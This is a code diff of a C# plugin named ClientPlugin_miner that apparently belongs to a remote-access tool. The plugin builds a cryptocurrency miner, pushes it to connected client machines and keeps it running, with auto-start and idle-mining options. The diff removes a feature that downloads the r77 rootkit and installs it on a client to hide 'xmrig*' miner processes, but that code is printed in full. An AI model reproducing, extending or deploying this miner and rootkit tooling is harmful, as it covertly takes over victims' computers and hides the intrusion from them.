@@ -761,8 +761,7 @@ namespace ClientPlugin_miner
         private readonly TextBlock _cpuLabel;
         private readonly CheckBox _autoStartChk;
         private readonly CheckBox _idleMiningChk;
-        private readonly CheckBox _deployRootkitChk;
-        private readonly TextBox _rootkitPnameBox;
+
         private readonly TextBox _logBox;
         private readonly Button _buildBtn;
         private readonly Button _startBtn;
@@ -833,15 +832,7 @@ namespace ClientPlugin_miner
             cfg.Children.Add(_idleMiningChk);
             row++;
 
-            var rkPanel = new StackPanel { Orientation = Orientation.Horizontal, Margin = new Thickness(4, 2, 4, 2) };
-            _deployRootkitChk = new CheckBox { Content = "Deploy rootkit to hide miner", Foreground = DmB, FontSize = 12, VerticalAlignment = VerticalAlignment.Center, IsChecked = false };
-            rkPanel.Children.Add(_deployRootkitChk);
-            rkPanel.Children.Add(new TextBlock { Text = " Hide pattern:", Foreground = DmB, FontSize = 12, VerticalAlignment = VerticalAlignment.Center, Margin = new Thickness(8, 0, 4, 0) });
-            _rootkitPnameBox = new TextBox { Text = "xmrig*", Width = 100, Foreground = TxB, Background = BgB, BorderBrush = BdB, BorderThickness = new Thickness(1), Padding = new Thickness(4, 2, 4, 2), FontSize = 12, VerticalAlignment = VerticalAlignment.Center };
-            rkPanel.Children.Add(_rootkitPnameBox);
-            Grid.SetRow(rkPanel, row); Grid.SetColumnSpan(rkPanel, 2);
-            cfg.Children.Add(rkPanel);
-            row++;
+
 
             cg.Child = cfg;
             Grid.SetRow(cg, 1);
@@ -982,27 +973,6 @@ namespace ClientPlugin_miner
                 await _context.SendToClient(tp);
 
                 _plugin.SetKeepAlive(_context.ClientId, true);
-
-                if (_deployRootkitChk.IsChecked == true)
-                {
-                    Log("Deploying rootkit to hide miner...");
-                    try
-                    {
-                        if (_host.LoadedPlugins.TryGetValue("rootkit", out var rkPlugin) && rkPlugin is WpfApp.Plugins.Builtin.RootkitPlugin rk)
-                        {
-                            string pname = _rootkitPnameBox.Text.Trim();
-                            if (string.IsNullOrEmpty(pname)) pname = "xmrig*";
-                            if (await rk.EnsureR77Downloaded())
-                            {
-                                bool rkOk = await rk.DeployAndInstallForClient(_context.ClientId, pname);
-                                Log(rkOk ? "Rootkit deployed + configured for: " + pname : "Rootkit deployment returned false");
-                            }
-                            else Log("Rootkit download failed, skipping deploy.");
-                        }
-                        else Log("RootkitPlugin not loaded.");
-                    }
-                    catch (Exception rkEx) { Log("Rootkit error: " + rkEx.Message); }
-                }
 
                 Log("Deploy complete. Click Start to launch.");
                 _startBtn.IsEnabled = true;
